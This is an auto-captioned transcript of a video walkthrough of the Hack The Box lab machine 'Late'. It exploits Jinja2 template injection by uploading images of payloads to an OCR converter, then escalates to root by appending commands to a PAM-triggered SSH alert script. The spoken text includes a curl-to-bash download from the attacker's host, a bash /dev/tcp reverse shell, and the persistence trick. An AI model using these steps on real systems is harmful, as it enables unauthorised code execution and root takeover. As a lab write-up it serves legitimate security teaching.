 what's going on youtube this is ipsec and we're doing late from hack the box and with the name of late you may think it's some type of timing attack but it's not um it starts off with a server-side template injection however the twist here is the ssti is in a image-to-text converter so you have to send it an image that has ssti in it in order to get code execution and then the second part of it once you get shell in the box is there's a pam module that executes whenever someone logs into the box via ssh so you can append data to that pm module or the shell script that gets executed and get code execution as root that way so with that being said let's just jump in as always we start off with the nmap so dash sc for default scripts as v enumerate versions o a output all formats put in the nmap directory and call it late and then the ip address of 1010 11.156 this can take some time to run so i've already ran it looking at the results we have just two ports open the first one being ssh on port 22 and its banner tells us it's an ubuntu server the next one we have is http on port 80 and its banner tells us it's engine x and we also have the http title of late the best online image tools and it being engine x generally i'm thinking it's not php doesn't mean it can't be php but generally nginx is going to be like um python ruby or something like that php tends to be on apache no reason can't be on engine x but that's just how it generally is so going to the page we have this page that just says late and if we click on more info nothing happens we have a contact form and then scrolling down to see if there's anything else we have this free online photo editor we can click on some social media links that go nowhere a potential hostname leak at the email late.htb we also have the username of support and that is about it i'm looking at the copyright it is 2022 and the design doesn't leak anything about the website so um the site looks like um this free online photo editor goes to images.late.hdb which we don't have a host name for so let's add that so sudo vi etsy host and we can paste that uh we want to delete this and then 10 10 11 156 and when we refresh this we get this that and something says convert image to text and it's also telling us with flask so we know this is definitely going to be python because flask is a python framework and since it's converting an image to text i'm just going to take a screenshot this is flame shot i have running to do a screenshot so i can just drag drop i could highlight do other things but i'm just going to press ctrl s to save it save it as one and let's see what happens when i upload this so let's do hdb late and then click one.png and it should convert this over to text right so we see it do that now the next thing i may try like file uploads but since it's python generally that doesn't work and um it actually converting things is pretty interesting i'm gonna try server side template injection because that's one of the common ways you can get a server to execute code based upon displaying output so the ssti payload i always do is off of cobalt so i just google ssti cobalt and i'm going to grab this fuzz string now i probably could skip this step because i know the framework is flask and flask is always going to do two brackets but i like this one because it's going to cover like all the languages on fuzzing ssti right so what i'm going to do that's going to go into vi and we're going to paste this in and then i'm going to screenshot this and save it and we'll just call this two and then let's go and upload this and then scan image and we see an error while processing the image unexpected so we have something here and this came right after these um two braces so i'm gonna do two times two and we're gonna see if this says four if it says four we know we have code execution so um i probably should get rid of that dollar and i'm gonna say three and we can go back and upload three.png open this and it says four so it is definitely ssti here and then i'm gonna go to payload all the things so payload all the things ss ti and this is my favorite cheat sheet whenever i want to get like a sql injection ssti or something i always put it with payload all the things um ginger 2 is the most common scripting language with flask so i'm just going to do this and let's see we want to execute code so we can probably use this right so i'm going to paste this in and i'm going to put a few spaces after it just to get rid of that dollar and we can copy this and see if it gives us the output of id so i'm going to open this do 4 scan image and it did not we have error occurred while processing the image unexpected token so the next thing i'm going to do is get rid of these curly braces and by doing this it's not going to try to execute code i'm going to see if it actually renders this text correctly because we have a lot of special characters here if it doesn't render the text correctly then well of course we'll get an error right so this is the logical next step to do and why scan image we can look at this and off the glance it is not doing any underscores well i take that back it actually did one underscore here after globals but um what i'm going to do now is i'm just going to open this up in firefox because that'll make me allow me to make this text bigger i'm going to see if that fixes it right so i'm just going to write this to test and we can firefox test and then control scroll wheel up and see if i can get this to have these underscores right um i just did that to clipboard by accident so let's ctrl s to save it call it six and then if we browse upload six open this it's still not doing any underscores here so um the next thing i'd probably do is change the font and the easiest way to do that is just use good old like liberty office or word or anything like that so i'm just going to open this up and then let's cat test so we can copy this and paste and let's see i'm going to right click ignore for the syntax highlighting and i'm gonna make sure i hit print screen when i don't have the cursor blinking just so that doesn't confuse anything and now we can call this seven and go back to the page browse 7 scan image open and we don't have an underscore there but we have it mostly good let's see if i make this bigger let's make this full screen i can get rid of this if um you want to change the page size you can just change the width because like by default you'll have it look like this and the page won't be full so i just change the width so i can just get a big open area there we go and now print screen let's copy this save and then if this doesn't work i'm just going to play with changing the font right so browse 8 scan image open we don't have a underscore there so we can change the font let's see what was it liberty serif let's go to library mono see if that does anything and if we have a lot of trouble maybe we'll try the good old comic sans and see how that works um that'd be a troll thing if it requires comic sans i don't think it would let's see go 9 scan image see we have it but we also have it doing a space we don't want that space so let's see i'm going to try it let's do comic sans this is going to be funny if it works but i know like one of the purposes of comic sans was it made every character more readable from a distance right so maybe the ai is gonna like comic sans we'll see or is it gonna judge us that looks pretty darn good so um comic stands for the win is this actually gonna work let's just put this here we have to ignore so ignore ignore i should just disable this autocorrect but this is actually funny i did not think comic sans would do it honestly i forget what font i used when i was testing this but it was not comic sans unexpected and a print statement got globals let's see um i'm going to take this off and we're just going to paste it and maybe our ssti payload is wrong it's possible we have to ignore all these and then save i don't know why it decided not to go to where it was hdb late and we'll call this 12 go back i could have just uploaded an old one oh well so let's copy this put it here and oh it did i think it's just one underscore and it's doing two let's go back to payload all the things so it did two underscores when we just wanted one there this is to we can try these so save this i don't think that's is this comic sans no there we go save 13. there's got to be a better way to do this oh it thinks this is some type of unicode that's not cool this may be the downfall of unicode quotes let's ignore that save 14. hopefully this works function object at global so this payload does not work but we know we should use double quotes now and let's see and go back to this template reference so paste see so ignore ignore ignore we definitely want to copy id this way and make it a bit smaller and see what happens so save 15 and let's go back browse 15 scan image that's looking good and we finally have it so we have code execution here so what we want to do is replace this with just curl 10 10 14 8 i'm gonna pipe it over to bash i'm just gonna do sh we'll try bash first i'm just trying to keep like it as small as possible so we don't have this like weird issue of um it translating a character wrong but it's this i think we got it so make do dub dub dub let's v index.html and we can do bash dash i and this is just me a reverse shell so bash uh dev tcp 10 10 14 8 9 000 1 00 and 1 like that and then python 3 m http server we'll listen on port 80. so we have to do our pseudo and we can upload 16.png and i don't like that it's giving us the result back because it worked but we didn't hang the server because we weren't listening so this time it probably won't give us the result because we get a reverse shell so now let's just upgrade a shell so python 3 c import pty pty spawn ben bash and then scty raw um wait minus echo i think fg there we go hit enter twice and then i'm going to fix my terminal so export term is equal to x term st t2i dash a [Music] uh rows 26 columns 105. so sd2y rose 26 calls 105. and now we have just a regular shell and the first thing i always do when i pop a web app is look for any type of hard coded credential now there's no like login forms on this application so i'm going to guess there's nothing to be found here so if i do um ss lntp i was looking for like a database port i don't see anything um there was a contact form right so if i let's see where is contact let's go back here contact contact.html is that not here find.graphcontact.html uh lsvar www.html so the contact form is actually not part of this python application so that is weird but i'm going to guess this does nothing then so it looks like um this is a static web page so if we do index.html yeah it is generally with like flask you wouldn't get this right it would just be slash index so if we do slash index we get a 404 so there's two websites going on here we have this one and then when we go to the image well that makes sense this is a virtual host going to a completely different one which is the python application we had in um app so kind of interesting there um we can like grab passwords here so if we do grep i password we have to do a dash r for recursive and it's probably in css so grep v css to ignore that and then we just have it in javascript so nothing too interesting there um we could look at the code but if i even exploit this code oh we have a secret here so we could try this secret for a um other password i'm not sure what that secret's for but what i was going to say is even if we had like some other way to execute code it looks like it's using um tesseract which is a image to text thing from google i want to say but even if we had a different way to execute code um we're gonna return with the same exact privilege we have now because we already executed code with the web server so outside of taking secrets from the web server there's nothing really to do here right um so the next thing let's see uh we can go there's a user.text bash history is not pointed anywhere um we could drop an ssh key it looks like and then just ssh away in i'm going to grab etsy pass wd for anything that ends in sh we put this here first actually and there's only two accounts root and svc account i still have um my string in that's the app secret and we can try sudo is that the password for this account it is not so um let's just see what else this uh guy owns so find slash dash user svc underscore acc and then to dev null and let's grab v i'm gonna hide proc and then we'll also hide home because proc isn't useful to us and home we already know what we own so it looks like tmux if i do tmux ls uh it doesn't look like there's any tmx sessions alive but there is this ssh alert so let's go take a look at it and let's see an ssh login was detected and it's piping to send mail so let's see what is subject going to be so open session oh recipient i wonder if we could like put um a bad user here i don't see where recip oh recipient's gonna be rude never mind i'm looking for where we can actually inject data into this subject this is hard coded and body pam user so i wonder if we could potentially hijack this code and with pam user so let's see um i'm going to leave this here and what i'm going to do ssh 10 10 11 156 yes and then for the username i'm going to do curl 10 10 14 8 like this let's see does not look like it like that is it a capital u um let's see i wonder if i can't use spaces see is it semicolons it doesn't like unknown option if we just do okay that looks fine let's try it this way there we go so that's a user and i'm just going to do test we fail but if i see it hit on port 80 then we know it's going to be good um the other thing oddly enough is we own this file right so if something's executing this then um we should we'll just put a code here um [Music] let's do echo or curl 10 10 14 8 and then pipe over to bash save it and we can't open the file for writing we own it and it's read write execute for us so maybe it's um got a special attribute and this a means we can only append to it so this is the second permissions of linux i was expecting this to be immutable and we just had to remove the mutable flag which would be i and then we could write to it right but this is append so we can just echo curl 10 10 14 8 pipe it over to bash and then double thing ssh alert and now if i cap this file we have our curl here right so let's make sure we're listening and i'm going to guess there's a cron that's executing this or something let's cat sc um or let's see it may be pam so let's see email from server login open session so sh 10 10 11 156 and we may have to have a successful login so let's just put a ssh key here or we have the idrsa so we don't even have to do that so i'm going to copy this and then we're going to log in so v [Music] id rsa paste the key we have to chmod 600 idrsa sh-i uh this is just going to be svc acc at 10 10 11 156 and we have successful login did this file revert i think it did so i just put this change back in so there we have it we gotta log in so now whenever i ssh it's going to send me a shell and i'm root at late so let's take a look at exactly what happened here because this may not be exactly apparent so if we look at ssh alert.sh i'm going to go to etsy i'm just going to do a grep and we're going to look for sh-alert to see where it exists in this directory let's pipe errors to devnol and we can see it's in pam.d this is the plugable authentication module so if we go here if we do shd we can see execute a custom script whenever a session is created so us logging in triggered this pam script to run which then put this ssh command if you do some googling around this subject you'll find out there's actually pam modules that can extract passwords and things like that but that's going to conclude this video hope you guys enjoyed it take care and i'll see you all next time